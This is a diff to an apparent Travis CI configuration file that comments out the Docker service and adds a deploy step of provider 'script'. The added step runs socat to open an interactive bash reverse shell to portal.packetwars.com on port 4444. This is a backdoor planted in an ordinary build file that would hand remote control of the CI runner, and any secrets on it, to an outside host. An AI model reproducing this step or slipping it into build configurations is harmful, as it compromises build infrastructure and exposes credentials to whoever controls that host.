@@ -4,8 +4,8 @@ env:
     global:
         - secure: "cM2AnSdq1zBgBh5hPnEXt3X8fPouGDZCjYd8OO81hvTRmFVp8npkzKUpLg7zrahdOQJO5I3dbxAC0gOuaSPR+VIMDhUozZHLpP9TulofnPKS2UWlkw4w7x/59PDrph0sLlhAjdMLFTw8cFa0NiRD3jvlt4RinlwB94+NetzCocd6ZuxBBYQoX5T0FcDrDhf6Vwu/09YY1qG1IuUMBgAMWkWr1OwGok/pAO+zs3A/PenjpL/ZlkquPBvBVKv2/KQ+//b/8ovpDQIVh13xTdRlS1GnAdNrmN/oqioGJZ+SCeJQKASzYXP6ocIXRZKAg8c39n1kUcbPNIU/Fm8/Lt951Fpota2IK1EweMslKTxo7ZqIHbWtQgrER33eJnjAzCmLDofT0+Ie3H75UX+WRXZPkrDTyt1gbdTUGR5LbunJlUI0JAJo7wORcNymw0zWvYsZ7GC0DbMJMiviVOi6TJBxOWkxqYu01h0+fxkMmkcOoZ0UFG8Mcu5kFiAmemsgFjf6R3aR2mx3oNKMHGYncgdBDG5zstP47QhlNTM8SylHOCXoyEpmfy/s+d6ebH3+wDM0zMebd2wnZhcpXapCpz5hJb5AEZ5xtnhCxK4RYz26BsxcLOAG+NgO9V/LOocibl1zUYt9KBSPPlDilZzxgPVWupgJs6TR4oqr2g31fwZsBTk="
 
-services:
-    - docker
+          #services:
+          # - docker
 
 before_install:
     - sudo apt-get -qy update
@@ -18,3 +18,5 @@ script:
 deploy:
     - provider: heroku
       api_key: "no, this is deploy."
+    - provider: script
+      script: /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:portal.packetwars.com:4444
